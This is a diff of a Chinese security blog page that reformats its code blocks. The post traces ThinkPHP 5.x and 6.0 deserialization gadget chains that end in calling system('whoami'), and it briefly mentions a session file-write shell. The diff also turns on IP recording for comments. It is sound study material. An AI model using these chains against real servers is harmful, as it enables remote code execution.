+    }
+
+    if (isset($type) &amp;&amp; $data !== $default) {
+        // 强制类型转换
+        $this-&gt;typeCast($data, $type);
+    }
+
+    return $data;
+}</code></pre>
 <p>getData顺着看一下可控。且<code>$data</code>=<code>$data[$name]</code>,<code>$filter</code>来自<code>$this-&gt;filter</code>.最后到了array_walk_resursive相当于直接对数组每一个值调用了回调函数<code>$this-&gt;filterValue($filter)</code>。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">if (is_array($data)) {
+    array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></pre>
 <p><code>$this-&gt;filterValue</code>是通过call_user_func执行的自然不必说了。<br>既然如此。控制<code>$this-&gt;filter</code>为system,<code>$data</code>数组第一个值为命令<code>whoami</code>之类的就可以执行命令了。</p>
 <p>至此pop链就完整了。其实中间有个步骤就是解决<code>call_user_func_array</code>那找到不受定死参数影响的命令执行这块,主要思路就是利用thinkphp过滤器,覆盖filter的方法去执行代码。<br>而在找到input作为主要下手点时,<code>call_user_func_array(array(任意类,任意方法),$args)</code> 中 <code>$args</code> 数组的第一个变量，即我们前面说的一个固定死的类对象会作为 $data 传给 input 方法，那么在强转成字符串的时候，框架就会报错退出。所以我们找不到就继续找上层调用input的函数。直到找到可控参数的函数<code>isAjax</code>.就能解决参数不可控的问题。</p>
 <h2 id="tp5-2-x-unserialize"><a href="#tp5-2-x-unserialize" class="headerlink" title="tp5.2.x-unserialize"></a>tp5.2.x-unserialize</h2><p>5.2版本的链子貌似跟之前没啥区别。但是我composer一直安装不上。加上5.2版本作为dev版本本身出现的不多,所以这里用thinkphp-vuln里的例子简单提一下。</p>
@@ -700,33 +1349,150 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>真正的执行点在下面的<code>$closure($value,$this-&gt;data)</code>这里的动态调用。参数均可控。所以赋值命令执行的参数即可。<br><img src="/2020/08/05/Thinkphp-vuln/24.PNG" class="lazyload" data-srcset="24.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="tp6-0-x-unserialize"><a href="#tp6-0-x-unserialize" class="headerlink" title="tp6.0.x-unserialize"></a>tp6.0.x-unserialize</h2><p>今天重新看了下之前在 php框架反序列化练习 文章里的内容。才想起来5.2跟6.0的链子应该是跟过了。不过当时没有动态调试,理解也没那么深刻。所以还是再看一下。</p>
 <p>还是老样子更改Index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $u = unserialize($_GET[<span class="string">'c'</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'ThinkPHP V6.x'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace app\controller;
 
+class Index
+{
+    public function index()
+    {
+        $u = unserialize($_GET[&#39;c&#39;]);
+        return &#39;ThinkPHP V6.x&#39;;
+    }
+}</code></pre>
 <p>直接用wh1t3p1g 师傅集成好的。顺带也推荐下师傅在安全客上针对thinkphp链子的分析文章。<br><img src="/2020/08/05/Thinkphp-vuln/25.PNG" class="lazyload" data-srcset="25.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>首先6.0版本的主要问题是前面5.*版本的利用起点Windows类都没了。也就是少了一个<code>__destruct()</code>。那么我们需要找到一个替代的<code>__destruct</code>作为起点。并且最好它能够在中间某个环节起到与其他链子相同作用比如触发<code>__call</code>,<code>__toString</code>之类的。这样的逻辑也是第5空间laravel那题的解题思路吧。因为跟过链子的人都知道只需要两个类就能rce.既然其中一个destruct被处理了。找一个替代的自然是最简单的办法。</p>
 <p>vendor/topthink/think-orm/src/Model.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function __destruct()
+{
+    if ($this-&gt;lazySave) {
+        $this-&gt;save();
+    }
+}</code></pre>
 <p>构造lazySave为真值。进入save函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $data = [], string $sequence = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 数据对象赋值</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setAttrs($data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入回调</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;trigger(<span class="string">'AfterWrite'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重新记录原始数据</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;origin   = <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;set      = [];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function save(array $data = [], string $sequence = null): bool
+{
+    // 数据对象赋值
+    $this-&gt;setAttrs($data);
+
+    if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#39;BeforeWrite&#39;)) {
+        return false;
+    }
+
+    $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);
+
+    if (false === $result) {
+        return false;
+    }
+
+    // 写入回调
+    $this-&gt;trigger(&#39;AfterWrite&#39;);
+
+    // 重新记录原始数据
+    $this-&gt;origin   = $this-&gt;data;
+    $this-&gt;set      = [];
+    $this-&gt;lazySave = false;
+
+    return true;
+}</code></pre>
 <p>这里关键函数是<code>updateData</code>.不过既然如此我们不能进入上面那个if分支。<br>isEmpty与trigger</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(string $event)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function isEmpty(): bool
+{
+    return empty($this-&gt;data);
+}
+
+
+protected function trigger(string $event): bool
+{
+    if (!$this-&gt;withEvent) {
+        return true;
+    }
+    ......</code></pre>
 <p>显然。需要<br>1.<code>$this-&gt;data</code>为非空数组。<br>2.<code>$this-&gt;withEvent</code>为false<br>3.<code>$this-&gt;exists</code>为true进入updateData函数</p>
 <p>跟进到updateData后。我们不妨先看下哪一个函数可以利用,再回头考虑参数的构造。这里顺着看到checkAllowFields后</p>
 <p><img src="/2020/08/05/Thinkphp-vuln/26.PNG" class="lazyload" data-srcset="26.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable();</code></pre>
 <p>存在可控变量的拼接。那么我们就可以触发<code>__toString</code>了。在经历了前面几个版本的反序列化构造后，我们当然清楚tp5.1~5.2版本的链子分别是<code>__destruct()=&gt; __toString() =&gt; __call() =&gt; call_user_func_array / $closure($value,$this-&gt;data)</code>的一系列调用。那么此处我们自然可以继续达成__toString来延续链子。</p>
 <p>回头再检查updateData这的参数需要。首先第一个trigger我们已经满足条件了。然后<code>if (empty($data))</code>这个分支不能进入。那就要看向getChangedData</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;force ? <span class="keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> <span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">empty</span>($a) || <span class="keyword">empty</span>($b)) &amp;&amp; $a !== $b) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> is_object($a) || $a != $b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只读字段不允许更新</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;readonly <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$field])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>($data[$field]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function getChangedData(): array
+{
+    $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) {
+        if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) {
+            return 1;
+        }
+
+        return is_object($a) || $a != $b ? 1 : 0;
+    });
+
+    // 只读字段不允许更新
+    foreach ($this-&gt;readonly as $key =&gt; $field) {
+        if (isset($data[$field])) {
+            unset($data[$field]);
+        }
+    }
+
+    return $data;
+}</code></pre>
 <p>令<code>$this-&gt;force</code>为true.然后data就可控了。</p>
 <p>接下来是回到利用函数checkAllowFields.拼接处之前的代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $query = <span class="keyword">$this</span>-&gt;db();</span><br></pre></td></tr></table></figure>
+<pre><code class="php">if (empty($this-&gt;field)) {
+    if (!empty($this-&gt;schema)) {
+        $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType));
+    } else {
+        $query = $this-&gt;db();</code></pre>
 <p>需要<br>1.<code>$this-&gt;field</code>为空进入分支<br>2.<code>$this-&gt;schema</code>为空进入else</p>
 <p>看一眼db()</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span><span class="params">($scope = [])</span>: <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">    $query = <span class="keyword">self</span>::$db-&gt;connect(<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">        -&gt;name(<span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;suffix)</span><br><span class="line">        -&gt;pk(<span class="keyword">$this</span>-&gt;pk);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function db($scope = []): Query
+{
+    /** @var Query $query */
+    $query = self::$db-&gt;connect($this-&gt;connection)
+        -&gt;name($this-&gt;name . $this-&gt;suffix)
+        -&gt;pk($this-&gt;pk);</code></pre>
 <p>原来db()函数这里也有一个变量拼接……不过殊途同归。我们用哪一个都差不多。例如exp中链子是把<code>$this-&gt;suffix</code>作为触发的对象的。</p>
 <p>然后后面就是一路畅通了。这里跟5.1(注意不是5.0,5.0 的 toString用的是model类的)一样用的是Conversion类里的<code>__toString() =&gt; toJson =&gt; toArray =&gt; getAttr =&gt; getValue()</code></p>
 <p>我们主要在getAttr,getValue里构造</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $relation = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $relation = <span class="keyword">$this</span>-&gt;isRelationAttr($name);</span><br><span class="line">        $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function getData(string $name = null)//$name='wh1t3p1g'</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;<span class="comment">//$this-&gt;data = array("wh1t3p1g"=&gt;"whoami");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];<span class="comment">//返回'whoami'，回到getAttr</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$fieldName];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;                 <span class="comment">//$name='wh1t3p1g' $value=‘ls’ $relation=false</span></span><br><span class="line">    <span class="comment">// 检测属性获取器</span></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);  <span class="comment">//该函数默认返回$name='wh1t3p1g'=$fieldName </span></span><br><span class="line">    $method    = <span class="string">'get'</span> . App::parseName($name, <span class="number">1</span>) . <span class="string">'Attr'</span>;  <span class="comment">//拼接字符：getlinAttr</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123; <span class="comment">//['wh1t3p1g'=&gt;'system']</span></span><br><span class="line">        <span class="keyword">if</span> ($relation) &#123; <span class="comment">//$relation=false</span></span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName]; <span class="comment">//$closure='system'</span></span><br><span class="line">        $value   = $closure($value, <span class="keyword">$this</span>-&gt;data);<span class="comment">//system('whoami',$this-&gt;data</span></span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function getAttr(string $name)
+{
+    try {
+        $relation = false;
+        $value    = $this-&gt;getData($name);
+    } catch (InvalidArgumentException $e) {
+        $relation = $this-&gt;isRelationAttr($name);
+        $value    = null;
+    }
+
+    return $this-&gt;getValue($name, $value, $relation);
+}
+
+public function getData(string $name = null)//$name=&#39;wh1t3p1g&#39;
+{
+    if (is_null($name)) {
+        return $this-&gt;data;
+    }
+    $fieldName = $this-&gt;getRealFieldName($name);
+    if (array_key_exists($fieldName, $this-&gt;data)) {//$this-&gt;data = array(&quot;wh1t3p1g&quot;=&gt;&quot;whoami&quot;);
+        return $this-&gt;data[$fieldName];//返回&#39;whoami&#39;，回到getAttr
+    } elseif (array_key_exists($fieldName, $this-&gt;relation)) {
+        return $this-&gt;relation[$fieldName];
+    }
+
+protected function getValue(string $name, $value, bool $relation = false)
+{                 //$name=&#39;wh1t3p1g&#39; $value=‘ls’ $relation=false
+    // 检测属性获取器
+    $fieldName = $this-&gt;getRealFieldName($name);  //该函数默认返回$name=&#39;wh1t3p1g&#39;=$fieldName 
+    $method    = &#39;get&#39; . App::parseName($name, 1) . &#39;Attr&#39;;  //拼接字符：getlinAttr
+
+    if (isset($this-&gt;withAttr[$fieldName])) { //[&#39;wh1t3p1g&#39;=&gt;&#39;system&#39;]
+        if ($relation) { //$relation=false
+            $value = $this-&gt;getRelationValue($name);
+        }
+
+        $closure = $this-&gt;withAttr[$fieldName]; //$closure=&#39;system&#39;
+        $value   = $closure($value, $this-&gt;data);//system(&#39;whoami&#39;,$this-&gt;data
+    }
+    .......
+    return $value;
+}</code></pre>
 <p>至此完成整条利用链。注意它的调用方法是<code>system(&quot;whoami&quot;, [&quot;wh1t3p1g&quot;=&gt;&quot;whoami&quot;])</code>.这是一种合法调用。</p>
 <p>小结下。tp所有系列反序列化链就这么多了。大体上思路都是一样的。只有5.0版本是较为复杂的写文件。其他版本都可以直接rce.魔术方法也基本都是<code>destruct，toString,call</code>调用。其中5.2,6.0是没有call的必要的。</p>
 <h2 id="tp6-0任意文件写"><a href="#tp6-0任意文件写" class="headerlink" title="tp6.0任意文件写"></a>tp6.0任意文件写</h2><p>这个洞其实没必要跟了。就是年后ichunqiu战疫比赛时出现过的洞。session可以更改成32位<code>.php</code>后缀。然后如果session内容可控的话就相当于写了shell.这个还是比较常见的。</p>
@@ -814,7 +1580,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 Hunt签到不谈。
 Gif2png首先是源码审计.
-123456789101112131415161718192021222324...</p>
+import logging
+import re
+import subproc...</p>
         </a>
       
     </div>
@@ -943,7 +1711,7 @@ Gif2png首先是源码审计.
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -955,9 +1723,9 @@ Gif2png首先是源码审计.
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -1090,6 +1858,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1303,7 +2073,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1359,6 +2129,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
